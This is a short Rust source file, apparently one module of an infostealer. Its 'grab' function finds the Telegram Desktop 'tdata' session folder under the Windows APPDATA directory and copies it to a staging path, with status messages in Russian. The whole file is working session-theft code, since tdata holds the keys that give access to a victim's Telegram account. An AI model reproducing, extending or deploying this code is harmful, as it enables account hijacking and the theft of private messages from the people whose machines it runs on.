use std::path::{Path, PathBuf};

pub fn grab(path: PathBuf) -> Option<String> {
    let app_data = std::env::var("APPDATA").ok()?;

    if Path::new(&format!("{}\\Telegram Desktop\\tdata", app_data)).exists() {
        match crate::utils::funcs::copy_dir_all(&Path::new(&format!("{}\\Telegram Desktop\\tdata", app_data)), &path) {
            Err(e) => println!("Ошибка копирования {}", e),
            Ok(res) => println!("Tdata Скопирована {:?}", res),
        };
    }

    return Some("Telegram".to_string());
}
